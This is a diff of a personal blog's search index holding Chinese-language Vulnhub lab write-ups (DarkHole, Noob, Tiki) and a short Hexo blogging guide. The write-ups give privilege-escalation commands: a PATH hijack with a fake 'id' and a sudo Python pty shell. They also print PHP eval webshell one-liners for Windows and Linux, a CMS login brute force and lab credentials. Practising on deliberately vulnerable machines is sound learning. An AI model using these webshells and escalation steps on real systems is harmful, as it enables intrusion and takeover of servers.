+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">切换到/home/john目录下，发现toto文件有执行权限，发现敏感文件user.txt 与 password</span><br><span class="line">执行toto</span><br><span class="line">发现toto文件的功能就是查询用户的uid gid 等参数，与命令id 功能相同,猜测toto文件可能使用的id命令，所以，如果我新建一个假的id命令，id文件中写入/bin/bash 字段，生成一个shell，从而达到提权的目的，因为现在所处的目录没有写的权限，所以在/tmp 目录下新建id文件</span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221106182157.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">touch id</span><br><span class="line">echo &quot;/bin/bash&quot; &gt; id</span><br><span class="line">chmod 777 id</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">cd /home/john</span><br><span class="line">./toto</span><br></pre></td></tr></table></figure>
+
+
+
+<p>参考文章:<a href="https://blog.csdn.net/rjszz1314/article/details/104399333">chmod 777 到底是啥 ???看完这个你就完全懂了！_人间世庄子的博客-CSDN博客_chmod777</a></p>
+<p>得益于文章描述很详细</p>
+<p>虽然不怎么明白但提权成功了</p>
+<p><img src="/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%8717.png"></p>
+<p><img src="/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%8718.png"></p>
+<p>这张图就可以看出我们从www-data 网站权限提升到了root权限组下的用户权限得到了john用户的密码</p>
+<p>但当我尝试 sudo su root 切换到root权限时,系统阻止我了</p>
+<p><img src="/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%8719.png"></p>
+<p>根据攻略,这里又有一道转换</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br><span class="line">#执行命令输入密码，回显可知，john可以以root的身份执行file.py</span><br><span class="line">所以在file.py 文件中写入 import pty;pty.spawn(&quot;/bin/bash&quot;)</span><br><span class="line">sudo 执行，即可提权</span><br><span class="line">进入root 目录，即可通关</span><br></pre></td></tr></table></figure>
+
+<p>两个攻略都提及到了这种方法</p>
+<p><a href="https://www.freebuf.com/articles/others-articles/284338.html">DARKHOLE: 1靶机 - FreeBuf网络安全行业门户</a></p>
+<p><a href="https://blog.csdn.net/wangxueying5172/article/details/121552506">DARKHOLE_1攻略_knight11112的博客-CSDN博客</a></p>
+<h1 id="root提权成功"><a href="#root提权成功" class="headerlink" title="root提权成功"></a>root提权成功</h1><p>经过上面的一顿操作后终于获得了root权限</p>
+<p><img src="/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%8720.png"></p>
+<p>好复杂,好多不知道的,好多要学的</p>
+<p><img src="/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%8721.png"></p>
+<p>登录进靶机验证</p>
+<p><img src="/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%8722.png"></p>
+<h1 id="成功"><a href="#成功" class="headerlink" title="成功!"></a>成功!</h1><h1 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h1><p>本次靶场从网站漏洞到获得服务器权限都并不复杂</p>
+<p>复杂的是在服务器内部提权的过程</p>
+<p>普通的文件上传的漏洞利用,甚至都没有如何为难我们的文件上传,</p>
+<p>在这其中我也学到了反弹shell的一种应用,后期还有多种方法,</p>
+<p>在服务器内部的提权也是没见过的例子,有很多知识点都没见过.</p>
+<h1 id="常看常新-多多学习"><a href="#常看常新-多多学习" class="headerlink" title="常看常新!多多学习~"></a>常看常新!多多学习~</h1><p><img src="/imgs/$%7Bfiilename%7D/%E7%B2%89%E5%A2%A9%E5%AD%90.gif"></p>
+]]></content>
+      <categories>
+        <category>靶场</category>
+      </categories>
+      <tags>
+        <tag>靶场渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>web基础</title>
     <url>/2022/10/17/17-43-58/</url>
     <content><![CDATA[<h1 id="总结一下到目前所学的基础知识"><a href="#总结一下到目前所学的基础知识" class="headerlink" title="总结一下到目前所学的基础知识:"></a>总结一下到目前所学的基础知识:</h1><p>大概涉及很多方面但涉及到的深入一点的也会另开新卷详细描述</p>
@@ -281,157 +565,6 @@
       </tags>
   </entry>
   <entry>
-    <title>vlunhub noob靶场总结</title>
-    <url>/2022/11/01/14-23-40/</url>
-    <content><![CDATA[<h2 id="又开了新的vlunhub靶场—–noob靶场（菜鸟）"><a href="#又开了新的vlunhub靶场—–noob靶场（菜鸟）" class="headerlink" title="又开了新的vlunhub靶场—–noob靶场（菜鸟）"></a>又开了新的vlunhub靶场—–noob靶场（菜鸟）</h2><h1 id="首先还是先讲述遇到的问题："><a href="#首先还是先讲述遇到的问题：" class="headerlink" title="首先还是先讲述遇到的问题："></a>首先还是先讲述遇到的问题：</h1><h2 id="ftp服务浏览器访问不了"><a href="#ftp服务浏览器访问不了" class="headerlink" title="ftp服务浏览器访问不了"></a>ftp服务浏览器访问不了</h2><p>这个问题困扰许久，搜了好久说的好像都是浏览器的问题，到了现在许多浏览器都不支持链接到网站的ftp服务了。</p>
-<h3 id="解决方式："><a href="#解决方式：" class="headerlink" title="解决方式："></a>解决方式：</h3><p>使用文件夹打开的方式：</p>
-<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221101143315.png"></p>
-<p>如图所示在文件夹搜索框输入：<a href="ftp://192.168.50.130/">ftp://192.168.50.130</a>  就能直接链接到ftp服务了，但注意在本次的靶机上此ftp服务是默认无密码的形式开启的，有的ftp服务是需要输入账号密码的。本次靶机限定了读取和下载功能不能修改和上传.  (也是,如果能修改和上传直接改成一句话木马不就行了)</p>
-<h1 id="信息收集："><a href="#信息收集：" class="headerlink" title="信息收集："></a>信息收集：</h1><p>在开始之前我们都要知道如何查找靶机的IP地址</p>
-<h3 id="查找攻击机IP："><a href="#查找攻击机IP：" class="headerlink" title="查找攻击机IP："></a>查找攻击机IP：</h3><p>Linux：ifconfig</p>
-<p>Windows：ipconfig</p>
-<h3 id="网段扫描：-发现靶机IP"><a href="#网段扫描：-发现靶机IP" class="headerlink" title="网段扫描：(发现靶机IP)"></a>网段扫描：(发现靶机IP)</h3><p>kili: netdiscover -r 192.168.50.1/24</p>
-<p>本次靶机相对于之前的earth靶机更容易，主要信息收集手段为nmap</p>
-<p>使用nmap命令:</p>
-<h3 id="使用全端口扫描，使用默认端口扫描命令会扫不到改变了端口的服务"><a href="#使用全端口扫描，使用默认端口扫描命令会扫不到改变了端口的服务" class="headerlink" title="使用全端口扫描，使用默认端口扫描命令会扫不到改变了端口的服务"></a>使用全端口扫描，使用默认端口扫描命令会扫不到改变了端口的服务</h3><p>命令： nmap -sV -Pn -sT -sC -A -p- 192.168.50.130</p>
-<p>（应该开单章来说明一下信息收集中的工具命令）</p>
-<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221101150614.png"></p>
-<p>如图所示,标下划线的为开启的服务，图中就能看出全端口扫描的作用</p>
-<h1 id="通过ftp服务获取网站的登录账号密码"><a href="#通过ftp服务获取网站的登录账号密码" class="headerlink" title="通过ftp服务获取网站的登录账号密码"></a>通过ftp服务获取网站的登录账号密码</h1><p>如开头中所粘贴的图片所示，在ftp服务里将其中的两个文件下载到本地</p>
-<p>在cre.txt 文件中得到一串base64加密过的字符</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Y2hhbXA6cGFzc3dvcmQ=</span><br></pre></td></tr></table></figure>
-
-<p>解密得:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">champ:password</span><br></pre></td></tr></table></figure>
-
-<p>使用账号密码登录:(当然在得到这个账号密码前肯定在这个登陆界面进行过其他的测试,如弱口令,注入等)</p>
-<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221101151446.png"></p>
-<p>登陆成功,在箭头所指的功能点,我们获取到一个.rar压缩文件.</p>
-<h1 id="图片隐写破译"><a href="#图片隐写破译" class="headerlink" title="图片隐写破译"></a>图片隐写破译</h1><p>如图</p>
-<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221101151836.png"></p>
-<p>在下载下的压缩文件里看到两张图片,根据攻略可知里面包含了图片隐写.(不看攻略你知道有这东西?实战里有谁会丧心病狂的将自己的账号密码隐写放在图片中.)</p>
-<p>参考链接:<a href="https://www.cnblogs.com/sainet/p/15667985.html">Vulnhub 靶场 NOOB: 1 - sainet - 博客园 (cnblogs.com)</a></p>
-<p>具体破译我就不尝试了,直接抄袭</p>
-<p>最后得到ssh服务的登录账号密码:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wtf:this one is a simple one</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h1 id="登录ssh"><a href="#登录ssh" class="headerlink" title="登录ssh"></a>登录ssh</h1><p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221101152924.png"></p>
-<p>如图箭头所示:</p>
-<p>成功远程登陆上ssh服务</p>
-<p>可以使用lastlog命令查看这台靶机的可以登录的账号以及登陆历史</p>
-<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221101154430.png"></p>
-<p>有一些是我在测试时添加到账号.</p>
-<h1 id="获得flag"><a href="#获得flag" class="headerlink" title="获得flag"></a>获得flag</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">VGhlIGZsYWcgaXMgdGhlIGVuY29kZWQgc3RyaW5nIGl0c2VsZg</span><br></pre></td></tr></table></figure>
-
-<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221101155258.png"></p>
-<p>从这张图可以看出我的历程,Linux命令不熟悉.</p>
-<h1 id="尝试"><a href="#尝试" class="headerlink" title="尝试:"></a>尝试:</h1><p>在看了这两个协议后,我想通过这两个协议上传webshell</p>
-<h2 id="尝试一"><a href="#尝试一" class="headerlink" title="尝试一:"></a>尝试一:</h2><p>使用ssh协议进行文件.</p>
-<p>命令:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scp /home/wugezhang/test.php wtf@192.168.50.130:/home/wtf/Downloads</span><br></pre></td></tr></table></figure>
-
-<p>不成功:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh: connect to host 192.168.50.130 port 22: Connection refused</span><br><span class="line">scp: Connection closed </span><br><span class="line"></span><br><span class="line">ssh：连接到主机 192.168.50.130 端口 22：连接被拒绝</span><br><span class="line">SCP：连接已关闭</span><br></pre></td></tr></table></figure>
-
-<p>一系列操作后发现不现实,如果能在对方环境添加环境变量更改设置了那传不传shell也无所谓了.</p>
-<p>但做好权限维持才是持久的道理.</p>
-<h2 id="尝试二"><a href="#尝试二" class="headerlink" title="尝试二:"></a>尝试二:</h2><p>使用匿名的ftp协议服务进行文件上传shell</p>
-<p>尝试将文件上传进ftp服务的文件夹但失败了,我们只有下载与读的权限,没有上传与修改权限.</p>
-<h2 id="尝试三"><a href="#尝试三" class="headerlink" title="尝试三:"></a>尝试三:</h2><p>尝试直接使用命令写入一句话木马</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;&lt;?php eval($_post[test]);?&gt;&quot; &gt; test.php</span><br></pre></td></tr></table></figure>
-
-<p>但失败了,在命令里直接就将$_post给执行了</p>
-<h3 id="原因"><a href="#原因" class="headerlink" title="原因:"></a>原因:</h3><p>1.Windows：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo ^&lt;? php @eval($_POST[&#x27;x&#x27;]); ?^&gt; &gt;shell.php</span><br></pre></td></tr></table></figure>
-
-<p>知识点：</p>
-<p>（1）^以转义字符的身份出现。因为在cmd环境中，有些字符具备特殊功能，如&gt;、&gt;&gt;表示重定向，|表示管道，&amp;、&amp;&amp;、||表示语句连接……它们都有特定的功度能，如果需要把它们作为字符输出知的话，echo &gt;、echo | ……之类的写法就会出错——cmd解释器会把它们作为具有特殊功能的字符对待，而不会作为普通字符处理，这个时候，就需道要对这些特殊字符做转义处理：在每个特殊字符回前加上转义字符^答，因此，要输出这些特殊字符，就需要用 echo ^&gt;、echo ^|、echo ^|^|、echo ^^……之类的格式来处理。此处转义&lt;和&gt;</p>
-<p>（2） 此处^为什么不换成引号？因为windows写入时会把引号写进去</p>
-<p>2.Linux:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;&lt;? php @eval($_POST[&quot;x&quot;]); ?&gt;&#x27; &gt;shell.php</span><br></pre></td></tr></table></figure>
-
-<p>知识点：</p>
-<p>$为linux系统的变量符号，原样输出字符串，不进行转义或取变量用单引号（此处否则会把$_POST当成变量处理）,x用双引号是为了和单引号区分</p>
-<h4 id="其次"><a href="#其次" class="headerlink" title="其次"></a>其次</h4><p>我们要写入网站的目录文件里面才能远程链接到shell</p>
-<p>失败了,我找不到网站根目录在哪里.</p>
-<p><img src="/imgs/$%7Bfiilename%7D/QQ%E5%9B%BE%E7%89%8720221101184629.gif"></p>
-<p>。。。。。。。。。。。。。</p>
-<h1 id="找到网站根目录"><a href="#找到网站根目录" class="headerlink" title="找到网站根目录"></a>找到网站根目录</h1><p>默认路径: /var/www/html</p>
-<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221101194829.png"></p>
-<p>发现前面的shell.php文件和test.php文件没能执行</p>
-<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221101195012.png"></p>
-<p>shell.php木马也没能在蚁剑上成功链接.</p>
-<p>但test.txt文件是可以成功显示的</p>
-<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221101195238.png"></p>
-<p>说明这样尝试是成功的.</p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h1><p>本次靶机的难度很低,最重要的就是使用nmap和Linux命令,</p>
-<p>图片隐写技术在现实生活中很少能用的上,主要就是ctf比赛里面的应用,所以本次我并没有花时间篇幅去使用.</p>
-<p>这次的靶机在我看来强调的就是ftp服务和ssh远程登录服务</p>
-<h2 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h2><p>ftp协议用于计算机与计算机之间的数据传输文件传输,不同于HTTP协议.ftp服务默认开启21端口,使用账号密码登录(设置后),也可以匿名登录(不安全).</p>
-<p>链接:<a href="https://www.cnblogs.com/peterYong/p/8630542.html">【FTP】详解 - peterYong - 博客园 (cnblogs.com)</a></p>
-<h2 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h2><p>ssh协议是用来支持远程登录的协议,也可以在有限制的条件下进行文件传输与读取.</p>
-<p>链接:<a href="https://blog.csdn.net/m0_52165864/article/details/126028681"> SSH服务详解_欢喜躲在眉梢里的博客-CSDN博客_ssh服务</a></p>
-]]></content>
-      <categories>
-        <category>靶场</category>
-      </categories>
-      <tags>
-        <tag>靶场渗透测试</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>vlunhub-tiki靶场</title>
-    <url>/2022/11/02/17-48-47/</url>
-    <content><![CDATA[<h1 id="vlunhub-tiki靶场（简单）"><a href="#vlunhub-tiki靶场（简单）" class="headerlink" title="vlunhub-tiki靶场（简单）"></a>vlunhub-tiki靶场（简单）</h1><h1 id="首先是遇到的问题"><a href="#首先是遇到的问题" class="headerlink" title="首先是遇到的问题"></a>首先是遇到的问题</h1><p>整次打靶过程可以说很顺利，可以很快速的达到自己想要的目的，但最重要的一点就是语言不通，进入后台后一直找不到ssh账号密码存在点，如果是实际渗透测试，可能花费的时间会更多。</p>
-<p>此外还在里面留了个坑，在本次的靶机里有一个文件上传点，要在里面测试能否实现木马后门传递。</p>
-<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>老规矩先使用ifconfig查找自己的IP</p>
-<p>使用netdiscover -r 192.168.50.1/24 探测靶机IP地址</p>
-<h2 id="注"><a href="#注" class="headerlink" title="注:"></a>注:</h2><p><img src=""><img src="/imgs/$%7Bfiilename%7D/image-20221102180434475-1667383526051.png" alt="image-20221102180434475"></p>
-<p>192.168.50.1   192.168.50.2     192.168.50.254 都是默认IP</p>
-<h2 id="使用nmap进行扫描"><a href="#使用nmap进行扫描" class="headerlink" title="使用nmap进行扫描"></a>使用nmap进行扫描</h2><p>命令:nmap -A</p>
-<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221102180946.png"></p>
-<p>如标注所示,在80端口找到突破点.</p>
-<p>这里的ssh历史我怀疑就是后面我们能凭借网站后台得到的账号密码登陆的原因</p>
-<p>或者是从这个ssh历史猜测</p>
-<p>我们得到的账号密码就能考虑为ssh的登录账号密码</p>
-<h2 id="网站显示"><a href="#网站显示" class="headerlink" title="网站显示"></a>网站显示</h2><p>依据扫描得到的robots.txt</p>
-<p>我们进入robots.txt界面</p>
-<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221102182447.png"></p>
-<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221102182622.png"></p>
-<p>在进入箭头指示的地址界面就能得到一个登陆界面</p>
-<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221102182803.png"></p>
-<p>在登录点尝试弱口令无果后,依据网站的Wiki cms,搜索曾经爆出的漏洞</p>
-<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221102183030.png"></p>
-<p>此cms曾爆出过漏洞,而且作者也明确了存在该漏洞.</p>
-<h2 id="Wiki-cms-漏洞利用"><a href="#Wiki-cms-漏洞利用" class="headerlink" title="Wiki cms 漏洞利用"></a>Wiki cms 漏洞利用</h2><p>依据漏洞poc进行测试</p>
-<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221102183900.png"></p>
-<p>设定password为变量,设置payloads后就可以爆破了</p>
-<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221102184104.png"></p>
-<h3 id="爆破成功"><a href="#爆破成功" class="headerlink" title="爆破成功"></a>爆破成功</h3><p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221102184431.png"></p>
-<p>如图,在爆破达到一定数量后,我们使用burp抓包修改为空密码就能登陆进去了</p>
-<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221102184453.png"></p>
-<p>登陆进去</p>
-<p>在 Wiki =&gt;last changes里面找到了ssh的账号密码</p>
-<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221102185130.png"></p>
-<p> ssh账号密码: silky:Agy8Y7SPJNXQzqA </p>
-<h1 id="ssh登录"><a href="#ssh登录" class="headerlink" title="ssh登录:"></a>ssh登录:</h1><p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221102185939.png"></p>
-<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221102190314.png"></p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h1><p>该靶场的难度并不大,还是</p>
-<p>信息收集,检测利用,得到ssh账号密码,ssh远程登录,权限查询,得到flag</p>
-<p>还考了我们burp的使用</p>
-]]></content>
-      <categories>
-        <category>靶场</category>
-      </categories>
-      <tags>
-        <tag>靶场渗透测试</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>内网学习笔记</title>
     <url>/2022/10/19/10-49-13/</url>
     <content><![CDATA[<h1 id="内网学习记录"><a href="#内网学习记录" class="headerlink" title="内网学习记录"></a>内网学习记录</h1>]]></content>
@@ -440,6 +573,50 @@
       </categories>
       <tags>
         <tag>内网学习</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>博客文章编写方式</title>
+    <url>/2022/10/15/17-58-19/</url>
+    <content><![CDATA[<h1 id="你好"><a href="#你好" class="headerlink" title="你好"></a>你好</h1><h2 id="博客的创建方式是先"><a href="#博客的创建方式是先" class="headerlink" title="博客的创建方式是先"></a>博客的创建方式是先</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo new &quot;文章主题&quot;</span><br><span class="line">然后去文件地址编辑</span><br><span class="line">编辑好后</span><br><span class="line">再</span><br><span class="line">hexo c</span><br><span class="line">hexo g</span><br><span class="line">hexo s</span><br><span class="line">上传到github是</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="给文章添加标签分类"><a href="#给文章添加标签分类" class="headerlink" title="给文章添加标签分类:"></a>给文章添加标签分类:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">title: 博客文章编写方式        #文章标题</span><br><span class="line">date: 2022-10-15 17:58:19   #文章编写修改时间</span><br><span class="line">tags: hexo博客搭建说明         #文章标签说明</span><br><span class="line">categories : 使用说明          #文章分类类别</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="图片上传"><a href="#图片上传" class="headerlink" title="图片上传:"></a>图片上传:</h1><p>由于上传不显示图片的原因,所以我采用了另一种图片上传方式,虽有些繁琐,但极大解决了不会修改图像链接的问题.</p>
+<p>首先,创建以上传博客文件命名的文件夹的插件和命令不用删除,我们可以将这个文件夹当作我们上传图片时的备份文件夹</p>
+<p>然后就是上传图片的操作了</p>
+<p>这是原帖子链接</p>
+<p><a href="https://blog.csdn.net/Qxiaofei_/article/details/124629908">(2条消息) 【Hexo】GitHub+Typora写博客+图片上传_Q大帅的博客-CSDN博客_hexo如何上传图片</a></p>
+<p>下面我先简单演示</p>
+<p>创建一个新的imgs文件夹,位于</p>
+<p><img src="/imgs/$%7Bfiilename%7D/20221016(1).png"></p>
+<p>source 目录下</p>
+<p>我们事先就已经在图片上传偏好设置里就将图片上传的默认目录修改好了</p>
+<p><img src="/imgs/$%7Bfiilename%7D/20221016(2).png"></p>
+<p>如图,接下来就是在编写的博客开头添加图像默认路径</p>
+<p>在”格式””图像””设置图片根目录”</p>
+<p>成功后</p>
+<p>如图:</p>
+<p><img src="/imgs/$%7Bfiilename%7D/20221016(3).png"></p>
+<p>随后就是插入图片</p>
+<p>在”格式” “图像” “插入图片”</p>
+<p>一定要记得将图片放在imgs 文件夹中</p>
+<p>这样引用图片时才不会出错</p>
+<p>然后也可以将图片放在对应博客名的文件夹中备份,方便修改时查阅</p>
+<p>最后放上我可爱的草神:</p>
+<p><img src="/imgs/$%7Bfiilename%7D/1.gif"></p>
+]]></content>
+      <categories>
+        <category>使用说明</category>
+      </categories>
+      <tags>
+        <tag>hexo博客搭建说明</tag>
       </tags>
   </entry>
   <entry>
@@ -667,50 +844,6 @@
       </categories>
       <tags>
         <tag>靶场渗透测试</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>博客文章编写方式</title>
-    <url>/2022/10/15/17-58-19/</url>
-    <content><![CDATA[<h1 id="你好"><a href="#你好" class="headerlink" title="你好"></a>你好</h1><h2 id="博客的创建方式是先"><a href="#博客的创建方式是先" class="headerlink" title="博客的创建方式是先"></a>博客的创建方式是先</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo new &quot;文章主题&quot;</span><br><span class="line">然后去文件地址编辑</span><br><span class="line">编辑好后</span><br><span class="line">再</span><br><span class="line">hexo c</span><br><span class="line">hexo g</span><br><span class="line">hexo s</span><br><span class="line">上传到github是</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="给文章添加标签分类"><a href="#给文章添加标签分类" class="headerlink" title="给文章添加标签分类:"></a>给文章添加标签分类:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">title: 博客文章编写方式        #文章标题</span><br><span class="line">date: 2022-10-15 17:58:19   #文章编写修改时间</span><br><span class="line">tags: hexo博客搭建说明         #文章标签说明</span><br><span class="line">categories : 使用说明          #文章分类类别</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h1 id="图片上传"><a href="#图片上传" class="headerlink" title="图片上传:"></a>图片上传:</h1><p>由于上传不显示图片的原因,所以我采用了另一种图片上传方式,虽有些繁琐,但极大解决了不会修改图像链接的问题.</p>
-<p>首先,创建以上传博客文件命名的文件夹的插件和命令不用删除,我们可以将这个文件夹当作我们上传图片时的备份文件夹</p>
-<p>然后就是上传图片的操作了</p>
-<p>这是原帖子链接</p>
-<p><a href="https://blog.csdn.net/Qxiaofei_/article/details/124629908">(2条消息) 【Hexo】GitHub+Typora写博客+图片上传_Q大帅的博客-CSDN博客_hexo如何上传图片</a></p>
-<p>下面我先简单演示</p>
-<p>创建一个新的imgs文件夹,位于</p>
-<p><img src="/imgs/$%7Bfiilename%7D/20221016(1).png"></p>
-<p>source 目录下</p>
-<p>我们事先就已经在图片上传偏好设置里就将图片上传的默认目录修改好了</p>
-<p><img src="/imgs/$%7Bfiilename%7D/20221016(2).png"></p>
-<p>如图,接下来就是在编写的博客开头添加图像默认路径</p>
-<p>在”格式””图像””设置图片根目录”</p>
-<p>成功后</p>
-<p>如图:</p>
-<p><img src="/imgs/$%7Bfiilename%7D/20221016(3).png"></p>
-<p>随后就是插入图片</p>
-<p>在”格式” “图像” “插入图片”</p>
-<p>一定要记得将图片放在imgs 文件夹中</p>
-<p>这样引用图片时才不会出错</p>
-<p>然后也可以将图片放在对应博客名的文件夹中备份,方便修改时查阅</p>
-<p>最后放上我可爱的草神:</p>
-<p><img src="/imgs/$%7Bfiilename%7D/1.gif"></p>
-]]></content>
-      <categories>
-        <category>使用说明</category>
-      </categories>
-      <tags>
-        <tag>hexo博客搭建说明</tag>
       </tags>
   </entry>
 </search>
